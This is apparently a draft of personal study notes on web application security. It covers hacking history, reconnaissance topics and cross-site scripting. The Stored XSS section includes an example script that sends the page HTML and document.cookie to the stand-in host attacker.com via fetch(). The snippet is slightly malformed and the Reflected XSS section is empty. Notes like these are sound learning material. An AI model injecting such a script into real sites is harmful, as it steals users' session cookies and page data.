---
title: "Web application security: exploitation and countermeasures for modern web applications"
date: 2024-05-21T16:58:21+03:00
draft: true
---


# History of hacking
## War time
1. Marian Rejewski - first to break Enigma code
  > Manual
2. Alan Turing - the Bombe machine, used `known plaintext` attack (KPA)
  > Computer automation

## Telephone era
3. Phreaking - hacking phone lines. Free long calls becuase of the 2600 Hz tone, that was used to signal end of call.

## Computer era
4. Morris worm, first worm in 1988 


## Recon
The more hacker nows about the target, 
ex. how many users contribute revenue to each strea
Without this knowledge hacker cannot properly target web applications.

### Web application mapping
Build up a map that represetn the structure of a web applciation.
Keep notes in any format as long as it is traversable, and preserves relationships and hierarchies ex. JSON, Notion etc.

### Authentication and Authorization
- Authentication: Who are you?
- Authorization: What can you do?

### Storages
- localStorage - SOP (Same Origin Policy) 
- sessionStorage - persists until the tab is closed
- IndexedDB - NoSQL database

### Subdomain enumeration
- zone transfer - DNS record copy. If the server is misconfigured, it can be used to get a list of subdomains 

### API discovery
### Dependency analysis
- CVE (Common Vulnerabilities and Exposures) - list of known vulnerabilities


## Offense

### XSS (Cross Site Scripting)
Execute malicious scripts in the context of a web application

#### Stored XSS
Client -Save-> Server -Display-> Client

```html
Hello! Hope you are having a great day!
<script>
  var data = document.documentElement.outerHTML;
  fetch('http://attacker.com', {
    method: 'POST',
    body: data
    cookie: document.cookie
  });
</script>
```

#### Reflected XSS
```html
```
